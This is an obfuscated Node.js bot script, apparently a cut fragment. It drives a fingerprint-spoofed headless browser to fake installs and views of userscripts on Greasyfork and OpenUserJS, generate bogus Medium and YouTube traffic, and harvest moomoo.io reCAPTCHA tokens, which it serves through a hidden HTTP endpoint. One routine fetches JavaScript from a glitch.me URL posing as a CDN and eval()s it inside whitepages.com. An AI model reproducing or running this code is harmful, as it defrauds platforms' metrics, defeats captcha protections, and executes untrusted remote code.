      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x1e, 'dc31') + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x18) + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + Z(0x1) + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + a0(0x7, 'uP#^') + '-routes-7c' + '9a6dd4dc7c',
    a1(0x1a) + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + Z(0x0) + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x3a9 * -0x1 + 0x333 + 0x76
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1c45 + -0x274 * 0x8 + -0x8a5)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x18ab + -0x1 * -0x607 + 0x1308), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xed * 0xe + 0x2 * 0x1328 + 0x429 * -0x6), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a2 = c,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x6 * -0x449 + -0x2 * -0x136d + -0xd24;
          if (await u['goto'](miscSites2[a2(0xd)](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x18ae + -0x9a2 + 0x2250; w < getRandomInt(0x1 * -0x2ff + -0x1 * -0x59f + -0x29f, 0x22 + -0x2c5 + -0x88 * -0x5); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x7356 * 0x1 + -0x8ac9 * 0x3 + 0x21765);
        }
      }();
    }, -0x7d4 + 0xcb4 + -0x47c), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const a3 = b;
        axios[a3(0xe, 'mo7#')]('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1e98 * 0x1 + -0x1fa0 + 0x6 * 0x2c;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x9cd + -0x1509 + -0x1 * -0x1ed6, -0x7 * 0xed + 0xdff + 0x1 * -0x752)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x7d1e + -0x179 * 0xc + 0x1 * 0x9be);
    }, -0x16e4 + 0x344 * 0x5 + 0x6f4), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x2 * -0x738 + 0x1e38 * 0x1 + -0x595 * 0x8;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x3 * -0x1c1 + 0xe * 0x222 + -0x1767), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x397 * 0x7 + -0x11f5 + 0x2 * 0x158b), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x3b9 * 0x3f5 + -0x2a2 * 0x675 + 0x2d76b7);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x117 * 0x1b + 0x2093 + -0x3d9c);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x18 * 0xe5 + 0x327 * 0xb + -0xc6d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1d * 0x17f + -0x1e4a + -0x1d * -0xa3);
}
doFlags['doOUJS'] && ((async () => {
  const a7 = b,
    a6 = d,
    a5 = c;
  async function f() {
    const a4 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xc03 * -0x3 + -0x14 * 0xd2 + -0x274 * 0x8) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1fe8 + -0x1410 + -0x377 * -0xf));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1244 * 0x1 + 0xbfe + 0x646, D['indexOf']('\x20'));
        return B ? E['slice'](0x1bf8 + 0xbe7 + -0x27df, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4afe + -0x167 * -0x1f + 0x4695),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x139 * -0xa + -0x1ca + 0x1ca0),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + a4(0x10) + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + a5(0x9) + 'Ad_Link_By' + a6(0x15) + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + a7(0xa, 'B8Ki') + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2 * 0xcaa + 0x63a + -0x1f8e; k < 0x8c2 + 0x2272 + -0x2 * 0x1598; k++)
    setTimeout(f, (-0xf229 + 0x11afa + 0x1 * 0xc18f) * k * getRandomInt(0x26a1 + 0x5 * -0x572 + 0x5b3 * -0x2, 0x7d3 * 0x3 + 0x11c * 0x3 + -0x3 * 0x8ee));
  setInterval(() => {
    f();
    for (let l = 0x22b * 0x9 + 0x40 * -0x2b + -0x8c3; l < 0x224c * -0x1 + 0x15b5 + 0xc9b; l++)
      setTimeout(f, (0x7f40 + -0x10b8c + 0x4 * 0x5dab) * l * getRandomInt(-0xed6 + 0x2 * 0xdb5 + -0x6f * 0x1d, -0x1199 + 0x52f * 0x3 + -0x1f * -0x11));
  }, -0x5a192d * -0x1 + 0x42f69d + -0x66214a);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
